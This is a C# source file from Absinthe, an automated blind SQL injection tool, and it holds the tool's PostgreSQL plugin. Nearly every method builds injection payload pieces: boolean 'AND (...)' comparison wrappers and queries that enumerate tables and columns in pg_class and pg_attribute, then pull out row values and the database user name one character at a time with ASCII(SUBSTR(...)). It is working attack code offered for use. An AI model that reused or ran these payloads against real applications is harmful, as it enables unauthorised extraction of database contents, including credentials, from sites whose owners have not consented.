//   Absinthe - The Automated Blind SQL Injection Tool
//   This software is Copyright (C) 2004  Xeron, 0x90.org
//   $Id: BlindPGSQL.cs,v 1.6 2005/08/16 22:23:25 nummish Exp $
//
//   This program is free software; you can redistribute it and/or modify
//   it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//   (at your option) any later version.
//
//   This program is distributed in the hope that it will be useful,
//   but WITHOUT ANY WARRANTY; without even the implied warranty of
//   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//   GNU General Public License for more details.
//
//   You should have received a copy of the GNU General Public License
//   along with this program; if not, write to the Free Software
//   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

using System.Text;
using System.Data;

public class PostgresBlindPlugin : Absinthe.Core.IBlindPlugin
{

	// {{{ AndEqualWrapper
	public string AndEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") = ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanEqualWrapper
	public string AndGreaterThanEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") >= ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanWrapper
	public string AndGreaterThanWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") > ");

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestTableID
	public string NextLowestTableID(long PrevTableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select MIN(reltype) from pg_class where relkind = chr(114) and substr(relname, 1,3) <> (chr(112)||chr(103)||chr(95)) and substr(relname, 1, 4) <> (chr(115)||chr(113)||chr(108)||chr(95)) and reltype > ").Append(PrevTableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameLength
	public string TableNameLength(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select LENGTH(relname) from pg_class where reltype = ").Append(TableID);
		
		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameCharacterValue
	public string TableNameCharacterValue(long Index, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select ASCII(SUBSTR(relname,").Append(Index).Append(",1)) from pg_class where reltype=").Append(TableID);
		
		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfRecords
	public string NumberOfRecords(string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(*) FROM ").Append(TableName);

		return retVal.ToString();
	}
	// }}}

	// {{{ PrimaryKeyColumn
	public string PrimaryKeyColumn(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		/* Naive: get the first column that is not null */
		retVal.Append("select min(attnum) from pg_attribute where attnum > 0 and attnotnull=true and attrelid=").Append(TableID - 1);

		return retVal.ToString();
	}
	// }}}

	// {{{ FieldDataType
	public string FieldDataType(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ATTTYPID FROM PG_ATTRIBUTE WHERE ATTNUM=").Append(FieldID).Append(" AND ATTRELID=").Append(TableID - 1);		
		
		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameLength
	public string FieldNameLength(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select length(attname) from pg_attribute where attnum=").Append(FieldID).Append(" AND attrelid=").Append(TableID-1);

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestFieldID
	public string NextLowestFieldID(long TableID, long PrevFieldID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(ATTNUM) FROM PG_ATTRIBUTE WHERE ATTNUM > ").Append(PrevFieldID).Append(" AND ATTRELID=").Append(TableID - 1);
		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameCharacterValue
	public string FieldNameCharacterValue(long Index, long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		
		retVal.Append("SELECT ASCII(SUBSTR(ATTNAME,").Append(Index).Append(",1)) FROM PG_ATTRIBUTE where ATTRELID=").Append(TableID - 1);
		retVal.Append(" AND ATTNUM=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfTables
	public string NumberOfTables()
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(relname) FROM pg_class WHERE  relkind = chr(114) and substr(relname, 1, 3) <> (chr(112)||chr(103)||chr(95)) and substr(relname, 1, 4) <> (chr(115)||chr(113)||chr(108)||chr(95))");

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfFieldsInTable
	public string NumberOfFieldsInTable(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT relnatts FROM pg_class WHERE reltype = ").Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ LengthOfConvertedPrimaryKeyValue
	public string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LENGTH(MIN(").Append(KeyName).Append(")) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(LengthOfConvertedPrimaryKeyValue(KeyName, TableName));
		retVal.Append(" WHERE ").Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConvertedPrimaryKeyValueCharacter
	public string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(").Append(KeyName).Append(",").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(ConvertedPrimaryKeyValueCharacter(Index, KeyName, TableName)).Append(" WHERE ");
		retVal.Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConcatenationCharacter
	public string ConcatenationCharacter
	{
		get
		{
			return "||";
		}
	}
	// }}}

	// {{{ CharConversionFunction
	public string CharConversionFunction(long DecimalValue)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("to_char(").Append(DecimalValue).Append(")");
		return retVal.ToString();
	}
	// }}}

	// {{{ IntegerPrimaryKeyValue
	public string IntegerPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(").Append(KeyName).Append(") FROM ").Append(TableName);
		return retVal.ToString();
	}

	public string IntegerPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(IntegerPrimaryKeyValue(KeyName, TableName)).Append(" WHERE ").Append(KeyName);
		retVal.Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ AndIsNullWrapper
	public string AndIsNullWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(" AND (").Append(Value).Append(") IS NULL ");
		return retVal.ToString();
	}
	// }}}

	// {{{ SelectValueForGivenPrimaryKey
	public string SelectValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT ").Append(FieldName).Append(" FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfValueForGivenPrimaryKey
	public string SelectLengthOfValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT LENGTH(").Append(FieldName).Append(") FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForGivenPrimaryKey
	public string SelectCharacterValueForGivenPrimaryKey(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(").Append(FieldName).Append(",").Append(Index).Append(",1)) FROM ");
		retVal.Append(TableName).Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfConvertedRecordValue
	public string SelectLengthOfConvertedRecordValue(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LENGTH(").Append(FieldName).Append(") FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForConvertedRecordValue
	public string SelectCharacterValueForConvertedRecordValue(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(").Append(FieldName).Append(",").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName).Append(" WHERE ").Append(pk.Name).Append(" = ").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectDatabaseUsernameLength
	public string SelectDatabaseUsernameLength()
	{
		return "SELECT LENGTH(USER)";
	}
	// }}}

	// {{{ SelectCharacterFromDatabaseUsername
	public string SelectCharacterFromDatabaseUsername(long Index)
	{
		StringBuilder retVal = new StringBuilder();

		
		retVal.Append("SELECT ASCII(SUBSTR(USER,").Append(Index).Append(",1))");
		
		return retVal.ToString();
	}
	// }}}

	// {{{ PluginDisplayTargetName
	public string PluginDisplayTargetName
	{
		get
		{
			return "PostgreSQL";
		}
	}
	// }}}
	
	// {{{ AuthorName
	public string AuthorName
	{
		get
		{
			return "Xeron";
		}
	}
	// }}}

	// {{{ ConvertNativeDataType 
	/* Oracle DataTypes:
		CHAR, NCHAR, VARCHAR2 and NVARCHAR2
		NUMBER and FLOAT
		DATE and TIMESTAMP
		LONG, RAW and LONG RAW
		BLOB, CLOB, NCLOB and BFILE
		ROWID and UROWID		
	*/
		
	public SqlDbType ConvertNativeDataType(long DataType)
	{
			switch (DataType)
			{
				case 16: // boolean
					return SqlDbType.Variant;
				case 18:
					return SqlDbType.Char;
				case 20:
					return SqlDbType.Int;
				case 21:
					return SqlDbType.Int;
				case 23:
					return SqlDbType.Int;
				case 25:
					return SqlDbType.VarChar;
				case 700:
					return SqlDbType.Float;
				case 701:
					return SqlDbType.Float;
				case 702:
					return SqlDbType.DateTime;
				case 703:
					return SqlDbType.DateTime;
				case 790:
					return SqlDbType.Float;
				case 1015:
					return SqlDbType.VarChar;
				case 1021:
					return SqlDbType.Float;
				case 1022:
					return SqlDbType.Float;
				case 1042:
					return SqlDbType.VarChar;
				case 1043:
					return SqlDbType.VarChar;
				case 1114:
					return SqlDbType.DateTime;
				case 1115:
					return SqlDbType.DateTime;								
			}

			return SqlDbType.Variant;
	}
	// }}}
}
